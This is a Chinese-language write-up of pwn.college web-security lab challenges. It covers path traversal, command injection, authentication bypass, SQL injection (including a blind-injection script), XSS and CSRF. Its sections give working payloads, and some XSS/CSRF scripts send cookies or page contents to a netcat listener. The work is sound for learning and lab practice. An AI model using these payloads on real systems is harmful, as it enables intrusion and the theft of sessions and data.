# 01-Path Traversal

在看到题目后，我将一系列内容扔给gpt。

于是我大致明白，~~存在`字符拼接`的漏洞，~~利用`../`修改路径，来读取`/flag`。

应该叫做`路径遍历`。

我们可以查看server文件的代码，如下：

```python
#!/opt/pwn.college/python

import flask
import os

app = flask.Flask(__name__)

@app.route("/", methods=["GET", "POST"])
@app.route("/<path:path>", methods=["GET", "POST"])
def challenge(path="index.html"):
    requested_path = app.root_path + "/files/" + path
    print(f"DEBUG: {requested_path=}")

    try:
        return open(requested_path).read()
    except PermissionError:
        flask.abort(403, requested_path)
    except FileNotFoundError:
        flask.abort(404, f"No {requested_path} from directory {os.getcwd()}")
    except Exception as e:
        flask.abort(500, requested_path + ":" + str(e))

app.secret_key = os.urandom(8)
app.config['SERVER_NAME'] = f"challenge.localhost:80"
app.run("challenge.localhost", 80)
```

我不懂flask，但是我要做的只是，找到如何拼接字符串达到我的目的。

我用如下代码进行测试：

```python
# !/opt/pwn.college/python

import flask
import os

app = flask.Flask(__name__)


@app.route("/", methods=["GET", "POST"])
@app.route("/<path:path>", methods=["GET", "POST"])
def challenge(path="index.html"):
    requested_path = app.root_path + "/files/" + path
    print(f"DEBUG: {requested_path=}")

    try:
        return open(requested_path).read()
    except PermissionError:
        flask.abort(403, requested_path)
    except FileNotFoundError:
        flask.abort(404, f"No {requested_path} from directory {os.getcwd()}")
    except Exception as e:
        flask.abort(500, requested_path + ":" + str(e))

if __name__ == '__main__':
    app.run(port=80)

```

我在kali上完整的模拟了题目的环境。

文件：

/flag文件

/challenge/file/index.html

/challenge/server.py

---

在这中间我遇到了相当多的问题。

首先，我不确定利用../是否可以就此切换目录，于是我使用cat进行实验

![image-20241031185655670](./02%20Web%20Security.assets/image-20241031185655670.png)

成功。

那么我们的思路是正确的。

所以我们可以构造URL：

`http://127.0.0.1:80/../../flag`

但是，curl和ipython使用requests库都失败了。

curl:

![image-20241031190115107](./02%20Web%20Security.assets/image-20241031190115107.png)

ipython:

![image-20241031190328611](./02%20Web%20Security.assets/image-20241031190328611.png)

这怎么办？

---

然后我想到，也许，需要进行转化成url符号？

于是转换后：

![image-20241031190436328](./02%20Web%20Security.assets/image-20241031190436328.png)

成功。

按照这个思路做题，成功。

```sh
$ curl -v http://127.0.0.1:10086/%2E%2E%2F%2E%2E%2Fflag

$ curl -v http://challenge.localhost:80/%2F..%2F..%2Fflag
```



## 总结

我了解到了URL编码

~~虽然我依旧没有搞懂，为什么../会在请求的过程中无效。~~

我后面理解了，考察的点就是路径遍历。

本质上只要做到：

```http
GET /../../flag HTTP/1.1
```

但是因为各种原因，无法达成这样，`.`和`/`总是被搞丢，最后只剩`/flag`。



# 02-Path Traversal2

## strip

我们先练习一下`strip`

```python
strip() 函数用于去除字符串开头和结尾的空白字符（包括空格、制表符、换行符等），或者去除指定的字符。它不会修改原字符串，而是返回一个新的字符串。

str.strip([chars])
chars（可选）：指定要去除的字符。如果省略，默认去除空白字符。
```

示例：

```python
text = "*!!!!!!tratfatf!!!!!!!******Hello, !!!!!!!********World!**"
stripped_text = text.strip('*!')
print(stripped_text)
```

输出：

```
tratfatf!!!!!!!******Hello, !!!!!!!********World
```

## exp

---

学习的过程就是

遇到问题（也称之为考试），思考脑子里是否有答案。

有答案，写。

没有答案，弄懂答案，理解记忆。

循环。

---

我在discord群组上寻找相关的内容，就是找答案。

果真就发现了。

我们的文件目录结构如下图所示：

多出来一些东西：

![image-20241101120756275](./02%20Web%20Security.assets/image-20241101120756275.png)

所以我们可以利用这个多出来的目录，进行绕过`./`。

---



```bash
$ curl -v challenge.localhost:80/fortunes%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fflag
```



# 03-cmdi-1

思路很简单

实现如下即可。使用url编码

```
ls -l  ; cat /flag
```

八仙过海各显神通，各有各的写法。

## exp

```
$ curl -v http://challenge.localhost:80/?directory=%20%3B%20cat%20%2Fflag
```

# 04-cmdi-2

## 描述

题目不允许使用;了。那就使用&&号码。

对如下内容url编码

```
/challenge && cat /flag
```

结果：

```
%2Fchallenge%20%26%26%20cat%20%2Fflag
```

## exp

```
curl -v http://challenge.localhost:80/?directory=%2Fchallenge%20%26%26%20cat%20%2Fflag
```



# 05-cmdi-3

什么叫做专业呢？

把一件事情，步骤化，系统化，可复制化。

比如做题写wp。

Data+Algorithms=Program

01，描述自己遇到什么问题。

02，使用自己的program能否解决问题

03，发现能够，那就实现。跳转12。

04，发现自己不能实现。

05，思考，如何快速准确高效的优化自己的Program。

06，无法优化。跳转到13。

07，可以优化。

08，优化自己的Program。

09，使用优化后的Program尝试解决问题。

10，发现自己依旧不能解决问题。跳转到05。

11，发现自己能够解决问题。

12，解决问题并记录下你的实现方法。结束。

13，立即放弃。

---



描述：

这道题在注入的时候，会存在两个单引号，执行的指令为：

```
ls -l '{directory}'
```

除此之外，不存在任何过滤。

## 思路

依旧是利用;

注意单引号。ls -l ''会报错，但不影响后面的指令的执行。

```
curl -v http://challenge.localhost:80/?directory=%27%20%3B%20cat%20%2Fflag%20%3B%20ls%20%27
```



# 06-cmdi-4

## 描述

依旧是构造指令。

我构造的指令如下：

```
TZ=; cat /flag # date
```



## 实现

exp

```
curl -v http://challenge.localhost:80/?timezone=%3B%20cat%20%2Fflag%20%23
```



# 07-cmdi-5

## 问题描述

你依旧可以执行指令，可以cat /flag。但是不会有任何的输出。

## 思路

所以就要重定向，然后本地打开。

## 实现

exp

```
; cat /flag > /home/hacker/flag
```

url编码，请求后，/home/hacker/flag就会出现，读就行了。



# 08-cmdi-6

## 问题描述

特殊符号被过滤了许多。因此，需要寻找新的符号

> you need to find a character that does the same thing as the semicolon but isn’t the semicolon
>
> 这句话来自discord大佬的hint



## 思路

问gpt：

![image-20241101172919385](./02%20Web%20Security.assets/image-20241101172919385.png)

所以需要的是换行符的url编码。

## 实现

exp

为了到达

```
ls -l .
cat /flag
```

具体：

```bash
curl -v http://challenge.localhost:80/?directory=.%0Acat%20%2Fflag
```



# 09-Authentication Bypass 1

## 问题描述

一大串代码

```python3
hacker@web-security~authentication-bypass-1:~$ cat /challenge/server 
#!/opt/pwn.college/python

import tempfile
import sqlite3
import flask
import os

app = flask.Flask(__name__)

# Don't panic about this class. It simply implements a temporary database in which
# this application can store data. You don't need to understand its internals, just
# that it processes SQL queries using db.execute().
class TemporaryDB:
    def __init__(self):
        self.db_file = tempfile.NamedTemporaryFile("x", suffix=".db")

    def execute(self, sql, parameters=()):
        connection = sqlite3.connect(self.db_file.name)
        connection.row_factory = sqlite3.Row
        cursor = connection.cursor()
        result = cursor.execute(sql, parameters)
        connection.commit()
        return result

db = TemporaryDB()
# https://www.sqlite.org/lang_createtable.html
db.execute("""CREATE TABLE users AS SELECT "admin" AS username, ? as password""", [os.urandom(8)])
# https://www.sqlite.org/lang_insert.html
db.execute("""INSERT INTO users SELECT "guest" as username, "password" as password""")

@app.route("/", methods=["POST"])
def challenge_post():
    username = flask.request.form.get("username")
    password = flask.request.form.get("password")
    if not username:
        flask.abort(400, "Missing `username` form parameter")
    if not password:
        flask.abort(400, "Missing `password` form parameter")

    # https://www.sqlite.org/lang_select.html
    user = db.execute("SELECT rowid, * FROM users WHERE username = ? AND password = ?", (username, password)).fetchone()
    if not user:
        flask.abort(403, "Invalid username or password")

    return flask.redirect(f"""{flask.request.path}?session_user={username}""")


@app.route("/", methods=["GET"])
def challenge_get():
    if not (username := flask.request.args.get("session_user", None)):
        page = "<html><body>Welcome to the login service! Please log in as admin to get the flag."
    else:
        page = f"<html><body>Hello, {username}!"
        if username == "admin":
            page += "<br>Here is your flag: " + open("/flag").read()

    return page + """
        <hr>
        <form method=post>
        User:<input type=text name=username>Pass:<input type=text name=password><input type=submit value=Submit>
        </form>
        </body></html>
    """

app.secret_key = os.urandom(8)
app.config['SERVER_NAME'] = f"challenge.localhost:80"
app.run("challenge.localhost", 80)
```

## 思路

我以为是sql注入什么的。

但是后面仔细看了看代码发现不是。

发现是给你guest的用户名和密码，但是admin只有用户名admin，密码是随机数。

当然要用admin登录才能拿到flag。

后来仔细看发现，guest登录后就会给一个session_user=guest

那直接改成admin不就实现了吗？

测试代码：

```python3
#!/opt/pwn.college/python

import tempfile
import sqlite3
import flask
import os

app = flask.Flask(__name__)
DATABASE = os.path.join(os.path.dirname(__file__), './my_database.db')
# Don't panic about this class. It simply implements a temporary database in which
# this application can store data. You don't need to understand its internals, just
# that it processes SQL queries using db.execute().
class TemporaryDB:
    def __init__(self):
        self.db_file = tempfile.NamedTemporaryFile("x", suffix=".db")

    def execute(self, sql, parameters=()):
        connection = sqlite3.connect(DATABASE)
        connection.row_factory = sqlite3.Row
        cursor = connection.cursor()
        result = cursor.execute(sql, parameters)
        connection.commit()
        return result

db = TemporaryDB()
# https://www.sqlite.org/lang_createtable.html
#db.execute("""CREATE TABLE users AS SELECT "admin" AS username, ? as password""", [os.urandom(8)])
# https://www.sqlite.org/lang_insert.html
db.execute("""INSERT INTO users SELECT "guest" as username, "password" as password""")

@app.route("/", methods=["POST"])
def challenge_post():
    username = flask.request.form.get("username")
    password = flask.request.form.get("password")
    if not username:
        flask.abort(400, "Missing `username` form parameter")
    if not password:
        flask.abort(400, "Missing `password` form parameter")

    # https://www.sqlite.org/lang_select.html
    user = db.execute("SELECT rowid, * FROM users WHERE username = ? AND password = ?", (username, password)).fetchone()
    if not user:
        flask.abort(403, "Invalid username or password")

    return flask.redirect(f"""{flask.request.path}?session_user={username}""")


@app.route("/", methods=["GET"])
def challenge_get():
    if not (username := flask.request.args.get("session_user", None)):
        page = "<html><body>Welcome to the login service! Please log in as admin to get the flag."
    else:
        page = f"<html><body>Hello, {username}!"
        if username == "admin":
            page += "<br>Here is your flag: " + open("/flag").read()

    return page + """
        <hr>
        <form method=post>
        User:<input type=text name=username>Pass:<input type=text name=password><input type=submit value=Submit>
        </form>
        </body></html>
    """

if __name__ == "__main__":
    app.run()


```



## 实现

我的exp

```bash
hacker@web-security~authentication-bypass-1:~$ curl http://challenge.localhost:80/?session_user=admin
<html><body>Hello, admin!<br>Here is your flag: pwn.college{sVPdxjB5_37fjKs0IdbId1NlsbS.QX5gzMzwCO5IzW}

        <hr>
        <form method=post>
        User:<input type=text name=username>Pass:<input type=text name=password><input type=submit value=Submit>
        </form>
        </body></html>
    hacker@web-security~authentication-bypass-1:~$ 
```

# 10-Authentication Bypass 2

## 问题描述

```python3
hacker@web-security~authentication-bypass-2:~$ cat /challenge/server 
#!/opt/pwn.college/python

import tempfile
import sqlite3
import flask
import os

app = flask.Flask(__name__)

class TemporaryDB:
    def __init__(self):
        self.db_file = tempfile.NamedTemporaryFile("x", suffix=".db")

    def execute(self, sql, parameters=()):
        connection = sqlite3.connect(self.db_file.name)
        connection.row_factory = sqlite3.Row
        cursor = connection.cursor()
        result = cursor.execute(sql, parameters)
        connection.commit()
        return result

db = TemporaryDB()
# https://www.sqlite.org/lang_createtable.html
db.execute("""CREATE TABLE users AS SELECT "admin" AS username, ? as password""", [os.urandom(8)])
# https://www.sqlite.org/lang_insert.html
db.execute("""INSERT INTO users SELECT "guest" as username, "password" as password""")

@app.route("/", methods=["POST"])
def challenge_post():
    username = flask.request.form.get("username")
    password = flask.request.form.get("password")
    if not username:
        flask.abort(400, "Missing `username` form parameter")
    if not password:
        flask.abort(400, "Missing `password` form parameter")

    # https://www.sqlite.org/lang_select.html
    user = db.execute("SELECT rowid, * FROM users WHERE username = ? AND password = ?", (username, password)).fetchone()
    if not user:
        flask.abort(403, "Invalid username or password")

    response = flask.redirect(flask.request.path)
    response.set_cookie('session_user', username)
    return response

@app.route("/", methods=["GET"])
def challenge_get():
    if not (username := flask.request.cookies.get("session_user", None)):
        page = "<html><body>Welcome to the login service! Please log in as admin to get the flag."
    else:
        page = f"<html><body>Hello, {username}!"
        if username == "admin":
            page += "<br>Here is your flag: " + open("/flag").read()

    return page + """
        <hr>
        <form method=post>
        User:<input type=text name=username>Pass:<input type=text name=password><input type=submit value=Submit>
        </form>
        </body></html>
    """

app.secret_key = os.urandom(8)
app.config['SERVER_NAME'] = f"challenge.localhost:80"
app.run("challenge.localhost", 80)
```

## 思路

跟上一道题一样，不过不同的地方是，post之后会存储cookies。

![image-20241101185836097](./02%20Web%20Security.assets/image-20241101185836097.png)

用guest登录之后，修改cookies里面的session_user为admin就行。

注意获取到flag后如何复制去提交。



# 11-SQLi 1

## 问题描述

```python3
hacker@web-security~sqli-1:~$ cat /challenge/server 
#!/opt/pwn.college/python

import tempfile
import sqlite3
import random
import flask
import os

app = flask.Flask(__name__)

class TemporaryDB:
    def __init__(self):
        self.db_file = tempfile.NamedTemporaryFile("x", suffix=".db")

    def execute(self, sql, parameters=()):
        connection = sqlite3.connect(self.db_file.name)
        connection.row_factory = sqlite3.Row
        cursor = connection.cursor()
        result = cursor.execute(sql, parameters)
        connection.commit()
        return result

db = TemporaryDB()
# https://www.sqlite.org/lang_createtable.html
db.execute("""CREATE TABLE users AS SELECT "admin" AS username, ? as pin""", [random.randrange(2**32, 2**63)])
# https://www.sqlite.org/lang_insert.html
db.execute("""INSERT INTO users SELECT "guest" as username, 1337 as pin""")

@app.route("/", methods=["POST"])
def challenge_post():
    username = flask.request.form.get("username")
    pin = flask.request.form.get("pin")
    if not username:
        flask.abort(400, "Missing `username` form parameter")
    if not pin:
        flask.abort(400, "Missing `pin` form parameter")
    
    if pin[0] not in "0123456789":
        flask.abort(400, "Invalid pin")

    try:
        # https://www.sqlite.org/lang_select.html
        query = f'SELECT rowid, * FROM users WHERE username = "{username}" AND pin = {pin}'
        print(f"DEBUG: {query=}")
        user = db.execute(query).fetchone()
    except sqlite3.Error as e:
        flask.abort(500, f"Query: {query}\nError: {e}")

    if not user:
        flask.abort(403, "Invalid username or pin")

    flask.session["user"] = username
    return flask.redirect(flask.request.path)

@app.route("/", methods=["GET"])
def challenge_get():
    if not (username := flask.session.get("user", None)):
        page = "<html><body>Welcome to the login service! Please log in as admin to get the flag."
    else:
        page = f"<html><body>Hello, {username}!"
        if username == "admin":
            page += "<br>Here is your flag: " + open("/flag").read()

    return page + """
        <hr>
        <form method=post>
        User:<input type=text name=username>PIN:<input type=text name=pin><input type=submit value=Submit>
        </form>
        </body></html>
    """

app.secret_key = os.urandom(8)
app.config['SERVER_NAME'] = f"challenge.localhost:80"
app.run("challenge.localhost", 80)
```

## 思路

这似乎是一个sql注入。

在username的输入框构造sql注入语句。

但是username这样注入并不能达到username == "admin"

```sql
admin" OR "1" = "1
```

相反，username == "admin" OR "1" = "1"

拼接多个sql语句：

![image-20241105140810906](./02%20Web%20Security.assets/image-20241105140810906.png)

一次只能执行一个sql语句。

看了看别人给的wp，是对pin进行注入。无法对username进行注入。但是可以对pin进行注入。

我只是在想，为什么我会告诉我自己，pin只能是数字呢？所以思路一直都没有放在对pin进行注入上。

```python3
# 源码对pin的要求

# pin本身也是字符串
pin = flask.request.form.get("pin")

# 只要求了pin的第一位是数字
if pin[0] not in "0123456789":
```

## exp

所以就很简答：

username

```
admin
```

pin

```
1235698 OR 1=1
```

如下图：

![image-20241105142422722](./02%20Web%20Security.assets/image-20241105142422722.png)



## 总结反思

要好好研究源码，最好能在本地模拟。

很多时候安全都是细节问题。

走的慢没什么，但是一定要走在正确的道路上。

# 12-SQLi 2

## 问题描述

如下

```python3
import tempfile
import sqlite3
import flask
import os

app = flask.Flask(__name__)

class TemporaryDB:
    def __init__(self):
        self.db_file = tempfile.NamedTemporaryFile("x", suffix=".db")

    def execute(self, sql, parameters=()):
        connection = sqlite3.connect(self.db_file.name)
        connection.row_factory = sqlite3.Row
        cursor = connection.cursor()
        result = cursor.execute(sql, parameters)
        connection.commit()
        return result

db = TemporaryDB()
# https://www.sqlite.org/lang_createtable.html
db.execute("""CREATE TABLE users AS SELECT "admin" AS username, ? as password""", [os.urandom(8)])
# https://www.sqlite.org/lang_insert.html
db.execute("""INSERT INTO users SELECT "guest" as username, "password" as password""")

@app.route("/", methods=["POST"])
def challenge_post():
    username = flask.request.form.get("username")
    password = flask.request.form.get("password")
    if not username:
        flask.abort(400, "Missing `username` form parameter")
    if not password:
        flask.abort(400, "Missing `password` form parameter")

    try:
        # https://www.sqlite.org/lang_select.html
        query = f"SELECT rowid, * FROM users WHERE username = '{username}' AND password = '{password}'"
        print(f"DEBUG: {query=}")
        user = db.execute(query).fetchone()
    except sqlite3.Error as e:
        flask.abort(500, f"Query: {query}\nError: {e}")

    if not user:
        flask.abort(403, "Invalid username or password")

    flask.session["user"] = username
    return flask.redirect(flask.request.path)

@app.route("/", methods=["GET"])
def challenge_get():
    if not (username := flask.session.get("user", None)):
        page = "<html><body>Welcome to the login service! Please log in as admin to get the flag."
    else:
        page = f"<html><body>Hello, {username}!"
        if username == "admin":
            page += "<br>Here is your flag: " + open("/flag").read()

    return page + """
        <hr>
        <form method=post>
        User:<input type=text name=username>Pass:<input type=text name=password><input type=submit value=Submit>
        </form>
        </body></html>
    """

app.secret_key = os.urandom(8)
app.config['SERVER_NAME'] = f"challenge.localhost:80"
app.run("challenge.localhost", 80)
```



## 分析与思路

跟11题很像。

这里发生变化的地方是，password是字符串而不是数字。

注入即可

![image-20241105155827986](./02%20Web%20Security.assets/image-20241105155827986.png)

## exp

admin

1234' OR '' = '

注意，这里是单引号，因为在sql语句中就是用单引号包裹这两个参数。

```sql
DEBUG: query="SELECT rowid, * FROM users WHERE username = 'admin' AND password = '1234' OR '' = ''"
这是debug信息，真正的sql语句就是：
SELECT rowid, * FROM users WHERE username = 'admin' AND password = '1234' OR '' = ''
```



# 13-SQLi 3

## 问题描述

> This level will require you to figure out how to chain SQL queries in order to leak data. Good luck!

## 思路

就是通过联合查询，泄露admin的password，这个password就是flag。



## exp

```
admin" UNION SELECT password FROM users--
```



# 14-SQLi 4

## 问题描述





## exp

第一步

```
admin"  UNION SELECT name FROM sqlite_master WHERE type='table'--
```

第二步

```
admin" union select password from users_7444461681 where username = "admin"--
```



# 15-SQLi 5

## 问题描述

不会回显的sql注入。



## 思路

只能sql blind injection（盲注）



## exp

这个脚本是chatgpt给我写的，而且就问了一次就写成。太牛逼了。

> 要编写一个盲注脚本来通过逐字符猜测数据库中的密码，我们可以使用 Python 的 requests 库进行 HTTP 请求，并结合布尔盲注法对数据库内容进行枚举。
>
> 假设我们要猜测 admin 用户的密码，可以逐字符猜测密码的每个字符的 ASCII 值，直到猜出完整的密码。以下是盲注脚本的示例：
>
> ```python3
> import requests
> import string
> 
> url = "http://challenge.localhost/"  
> target_user = "admin"
> guessed_password = ""
> 
> # 逐字符猜测密码
> while True:
>     found_character = False
>     for char in string.printable:  # 使用可打印字符进行猜测
>         payload = {
>             "username": f'{target_user}" AND substr(password,{len(guessed_password) + 1}, 1) = "{char}" -- ',
>             "password": "anything"
>             # 任何内容，因为 `password` 字段已在SQL注入条件中被绕过
>         }
> 
>         response = requests.post(url, data=payload)
> 
>         # 判断响应是否与之前不同来推测字符是否正确
>         if "Hello, admin" in response.text:
>             guessed_password += char
>             print(f"[+] Guessed so far: {guessed_password}")
>             found_character = True
>             break  
>             # 找到字符后，跳出循环尝试下一个字符
> 
>     # 如果在循环中没有找到新字符，则猜测结束
>     if not found_character:
>         print(
>             f"[+] Password for {target_user} is: 				{guessed_password}"
>         )
>         break
> '''
> 脚本解释
> SQL 注入构造：我们使用:
> substr(password, {len(guessed_password) + 1}, 1) 
> 来获取 password 的每个字符，char 是我们猜测的当前字符。SQL 注入条件为 username 参数构造的部分。
> 布尔判断：每次请求后，检查响应页面中是否出现 Hello, admin。如果匹配，则表示字符猜对，加入 guessed_password，否则继续猜测下一个字符。
> 终止条件：当一轮猜测无法找到新字符时，说明我们已猜完所有字符。
> 注意事项
> 该脚本假定目标服务器在本地。若部署在其他服务器上，请更改 url 变量。
> app.secret_key 和其他安全设置在实际部署时应当妥善配置，以确保应用的安全性。
> 这样可以逐步枚举出 admin 的密码。
> '''
> ```



# 16-XSS-1

首先要知道，什么是html，什么是css，什么是js。

也就是前端三剑客。

然后，仔细的阅读代码。server文件和victim文件。

这一题中，server是干什么的？

你输入什么，他就给写进html文件里。

如图所示:

![image-20241110174518840](./02%20Web%20Security.assets/image-20241110174518840.png)

下图中红框内的东西都是我自己输入然后被写进html文件并且返回的。

![image-20241110174631065](./02%20Web%20Security.assets/image-20241110174631065.png)

那么victim文件又是干什么的呢？

就是检测这个html里面是否有<input type = "text">。

如果有，就返回flag。

所以我们要做的就是写一个input进去。

# 17-XSS-2

the same like the previous one ,but you should post 

```s
<script>alter("PWNED")</script>
```

let's view the source code:

![image-20241110180122494](./02%20Web%20Security.assets/image-20241110180122494.png)

then run the victim to get the flag

# 18-XSS-3

you must pass an url as the argument to invoke the victim program

and the argument "msg" of url should be alert()

and you need to use the url encode

```
$ /challenge/victim "http://challenge.localhost:80?msg=%3Cscript%3Ealert%28%27PWNED%27%29%3C%2Fscript%3E"
```

也就是实现：

```
msg=<script>alert('PWNED')</script>
```



# 19-XSS-4

exp

```
hacker@web-security~xss-4:~$ /challenge/victim "http://challenge.localhost:80/?msg=%3C%2Ftextarea%3E%3Cscript%3Ealert%28%22PWNED%22%29%3C%2Fscript
%3E%3Ctextarea%3E"
```

也就是实现：

```
msg=</textarea><script>alert("PWNED")</script><textarea>
```



# 20-XSS-5

```javascript
<script>
// 获取表单中的提交按钮元素
const publishButton = document.querySelector('form[action="publish"] input[type="submit"]');

// 每秒自动点击一次该按钮
setInterval(() => {
    if (publishButton) {
        publishButton.click();
        console.log('Clicked on "Publish All Drafts" button');
    } else {
        console.log('Publish button not found.');
    }
}, 1000);  // 每1秒点击一次
</script>
```

就是admin登录后就自动点击这个publish。

# 21-XSS-6

和5是一样的题解。我觉得我的题解是非预期解。

```javascript
<script>
// 获取表单中的提交按钮元素
const publishButton = document.querySelector('form[action="publish"] input[type="submit"]');

// 每秒自动点击一次该按钮
setInterval(() => {
    if (publishButton) {
        publishButton.click();
        console.log('Clicked on "Publish All Drafts" button');
    } else {
        console.log('Publish button not found.');
    }
}, 1000);  // 每1秒点击一次
</script>
```

我没有使用fecth。



# 22-XSS-7

就是带着cookie发送请求过去

xss

```js
<script>
    fetch("http://127.0.0.1:9876", {
        method: "POST",
        body: document.cookie,
        headers: {
            "Content-Type": "application/x-www-form-urlencoded"
        }
    });
</script>

```

nc

```
nc -lvp 9876
```





# 23-CSRF-1



```python
from http.server import SimpleHTTPRequestHandler, HTTPServer

class CSRFHandler(SimpleHTTPRequestHandler):
    def do_GET(self):
        if self.path == "/":
            self.send_response(200)
            self.send_header("Content-type", "text/html")
            self.end_headers()
            # 将字符串转换为字节对象
            self.wfile.write("""
                <html>
                  <body>
                    <h1>CSRF Attack in Progress</h1>
                    <script>
                        // 自动跳转到目标站点
                        window.location.href = "http://challenge.localhost/publish";
                    </script>
                  </body>
                </html>
            """.encode())  # .encode() 将字符串转换为字节对象

server = HTTPServer(("0.0.0.0", 1337), CSRFHandler)
print("CSRF attack server running at http://hacker.localhost:1337/")
server.serve_forever()
```

原理：

admin作为victim登录后，会主动去访问我们的1337端口。

于是我们的1337端口的程序就要做点手脚了。

server的代码里面什么也做不了。

没有办法插入xss让admin登录之后就自动点击publish

但是我们的1337程序就要自动跳转到publish

这样我们随便登录就能看到admin的flag了。



# 24-CSRF-2

正错解，为什么呢？

## 错解

这个是：

```python
hacker@web-security~csrf-2:~$ cat ./csrf2.py 
from http.server import SimpleHTTPRequestHandler, HTTPServer

class CSRFHandler(SimpleHTTPRequestHandler):
    def do_GET(self):
        if self.path == "/":
            self.send_response(200)
            self.send_header("Content-type", "text/html")
            self.end_headers()
            # 将字符串转换为字节对象
            self.wfile.write("""
                <html>
                  <body>
                    <h1>CSRF Attack in Progress</h1>
                    <script>
                        // 使用 POST 请求模拟攻击
                        fetch("http://challenge.localhost/publish", {
                            method: "POST", 
                            headers: {
                                "Content-Type": "application/x-www-form-urlencoded"
                            },
                            body: ""  // 如果需要，可以添加额外的数据
                        }).then(response => {
                            console.log("Request sent successfully!");
                        }).catch(error => {
                            console.log("Request failed", error);
                        });
                    </script>
                  </body>
                </html>
            """.encode())  # .encode() 将字符串转换为字节对象

server = HTTPServer(("0.0.0.0", 1337), CSRFHandler)
print("CSRF attack server running at http://hacker.localhost:1337/")
server.serve_forever()
```

## 正解

这个是

```python


hacker@web-security~csrf-2:~$ vim ./csrf
hacker@web-security~csrf-2:~$ vim ./csrf2.py 
hacker@web-security~csrf-2:~$ cat ./csrf2.py 
from http.server import SimpleHTTPRequestHandler, HTTPServer

class CSRFHandler(SimpleHTTPRequestHandler):
    def do_GET(self):
        if self.path == "/":
            self.send_response(200)
            self.send_header("Content-type", "text/html")
            self.end_headers()

            # Inject an HTML form into the page and submit it using JavaScript
            self.wfile.write("""
                <html>
                  <body>
                    <h1>CSRF Attack in Progress</h1>
                    <form id="csrfForm" action="http://challenge.localhost/publish" method="POST">
                        <!-- You can add other required form fields here if needed -->
                    </form>
                    <script>
                        // Automatically submit the form without user interaction
                        document.getElementById("csrfForm").submit();
                    </script>
                  </body>
                </html>
            """.encode())

server = HTTPServer(("0.0.0.0", 1337), CSRFHandler)
print("CSRF attack server running at http://hacker.localhost:1337/")
server.serve_forever()
```

非得自己写个form然后再跳转吗？

# 25-CSRF-3

正确的exp：

```python
from http.server import SimpleHTTPRequestHandler, HTTPServer
import urllib.parse

class CSRFHandler(SimpleHTTPRequestHandler):
    def do_GET(self):
        if self.path == "/":
            self.send_response(200)
            self.send_header("Content-type", "text/html")
            self.end_headers()

            # 恶意消息
            msg = '<script>alert("PWN: Success!")</script>'

            # 对消息进行 URL 编码
            encoded_msg = urllib.parse.quote(msg)

            # 构造恶意 URL
            payload = f'http://challenge.localhost:80/ephemeral?msg={encoded_msg}'

            # 生成 HTML 页面并插入跳转脚本
            self.wfile.write(f"""
                <html>
                  <body>
                    <script>
                        // 通过 JavaScript 强制跳转到包含恶意 payload 的 URL
                        window.location.href = "{payload}";
                    </script>
                  </body>
                </html>
            """.encode())

# 启动 HTTP 服务器
server = HTTPServer(("0.0.0.0", 1337), CSRFHandler)
print("CSRF attack server running at http://hacker.localhost:1337/")
server.serve_forever()
```

诱导实现同源跳转，然后再注入xss进行alert。



# 26-CSRF-4

exp

```py
from http.server import SimpleHTTPRequestHandler, HTTPServer
import urllib.parse

class CSRFHandler(SimpleHTTPRequestHandler):
    def do_GET(self):
        if self.path == "/":
            self.send_response(200)
            self.send_header("Content-type", "text/html")
            self.end_headers()

            # 恶意消息
            msg = '<script>fetch("http://127.0.0.1:9876",{method:"POST",body:document.cookie,headers:{"Content-Type":"application/x-www-form-urlencoded"}});</script>'

            # 对消息进行 URL 编码
            encoded_msg = urllib.parse.quote(msg)

            # 构造恶意 URL
            payload = f'http://challenge.localhost:80/ephemeral?msg={encoded_msg}'

            # 生成 HTML 页面并插入跳转脚本
            self.wfile.write(f"""
                <html>
                  <body>
                    <script>
                        // 通过 JavaScript 强制跳转到包含恶意 payload 的 URL
                        window.location.href = "{payload}";
                    </script>
                  </body>
                </html>
            """.encode())

# 启动 HTTP 服务器
server = HTTPServer(("0.0.0.0", 1337), CSRFHandler)
print("CSRF attack server running at http://hacker.localhost:1337/")
server.serve_forever()
```

还要开启一个端口，接受fetch：

```
nc -lvp 9876
```

诱导实现同源跳转，然后xss注入实现fetch发送cookie出去。



---



跳转到这个位置，发送cookie也行，我觉得可以直接发送flag。

参考csrf5。

# 27-CSRF-5

不允许发送cookie出去了。

那么我们该怎么办呢？

我的一个想法是直接fetch这个flag文件。

但是flag文件怎么获取到呢？

---

所以不会的时候，好好看题目，好好看源码。

---



真是开了眼了。

很想扇我自己几巴掌。

admin登录后直接就会显示flag。

但是我们这里的victim是不显示登录界面的。

所以我们只能在admin登录之后把他的界面发送过来。

exp：

```py
#!/opt/pwn.college/python

from http.server import SimpleHTTPRequestHandler, HTTPServer
import urllib.parse

class CSRFHandler(SimpleHTTPRequestHandler):
    def do_GET(self):
        if self.path == "/":
            self.send_response(200)
            self.send_header("Content-type", "text/html")
            self.end_headers()

            # 构造恶意 JavaScript 脚本
            msg = '<script>fetch("http://challenge.localhost:80/",{method:"GET"}).then(response => response.text()).then(data => {fetch("http://127.0.0.1:9876",{method:"POST",body:data,headers:{"Content-Type":"application/x-www-form-urlencoded"}});});</script>'

            # 对消息进行 URL 编码
            encoded_msg = urllib.parse.quote(msg)

            # 构造恶意 URL
            payload = f'http://challenge.localhost:80/ephemeral?msg={encoded_msg}'
            # 生成 HTML 页面并插入跳转脚本
            self.wfile.write(f"""
                <html>
                  <body>
                    <script>
                        // 通过 JavaScript 强制跳转到包含恶意 payload 的 URL
                        window.location.href = "{payload}";
                    </script>
                  </body>
                </html>
            """.encode())

# 启动 HTTP 服务器
server = HTTPServer(("0.0.0.0", 1337), CSRFHandler)
print("CSRF attack server running at http://hacker.localhost:1337/")
server.serve_forever()


```

也就是fetch套fetch。

除此之外，我们还需要在开一个端口来接收：

```
nc -lvp 9876
```

